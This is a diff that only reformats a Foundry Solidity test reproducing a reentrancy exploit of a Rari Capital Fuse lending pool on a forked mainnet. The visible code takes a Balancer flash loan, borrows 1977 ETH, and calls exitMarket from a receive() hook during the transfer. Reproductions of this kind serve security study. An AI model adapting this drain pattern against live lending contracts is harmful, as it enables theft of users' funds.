@@ -10,36 +10,27 @@ import {ICErc20Delegate} from "src/interfaces/ICErc20Delegate.sol";
 import {IBalancerVault} from "src/interfaces/IBalancerVault.sol";
 
 contract ContractTest is Test {
+
     IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
 
-    ICEtherDelegate fETH_127 =
-        ICEtherDelegate(payable(0x26267e41CeCa7C8E0f143554Af707336f27Fa051));
+    ICEtherDelegate fETH_127 = ICEtherDelegate(payable(0x26267e41CeCa7C8E0f143554Af707336f27Fa051));
 
-    ICErc20Delegate fusdc_127 =
-        ICErc20Delegate(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47);
+    ICErc20Delegate fusdc_127 = ICErc20Delegate(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47);
 
-    IUnitroller rari_Comptroller =
-        IUnitroller(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);
+    IUnitroller rari_Comptroller = IUnitroller(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);
 
-    IBalancerVault vault =
-        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    IBalancerVault vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
 
     function setUp() public {
         vm.createSelectFork("mainnet", 14_684_813); //fork mainnet at 14684813
     }
 
     function testExploit() public {
-        emit log_named_uint(
-            "ETH Balance of fETH_127 before borrowing",
-            address(fETH_127).balance / 1e18
-        );
+        emit log_named_uint("ETH Balance of fETH_127 before borrowing", address(fETH_127).balance / 1e18);
 
         payable(address(0)).transfer(address(this).balance);
 
-        emit log_named_uint(
-            "ETH Balance after sending to blackHole",
-            address(this).balance
-        );
+        emit log_named_uint("ETH Balance after sending to blackHole", address(this).balance);
 
         address[] memory tokens = new address[](1);
 
@@ -87,15 +78,9 @@ contract ContractTest is Test {
 
         fETH_127.borrow(1977 ether);
 
-        emit log_named_uint(
-            "ETH Balance of fETH_127_Pool after borrowing",
-            address(fETH_127).balance / 1e18
-        );
+        emit log_named_uint("ETH Balance of fETH_127_Pool after borrowing", address(fETH_127).balance / 1e18);
 
-        emit log_named_uint(
-            "ETH Balance of me after borrowing",
-            address(this).balance / 1e18
-        );
+        emit log_named_uint("ETH Balance of me after borrowing", address(this).balance / 1e18);
 
         usdc_balance = usdc.balanceOf(address(this));
 
@@ -117,4 +102,5 @@ contract ContractTest is Test {
     receive() external payable {
         rari_Comptroller.exitMarket(address(fusdc_127));
     }
+
 }
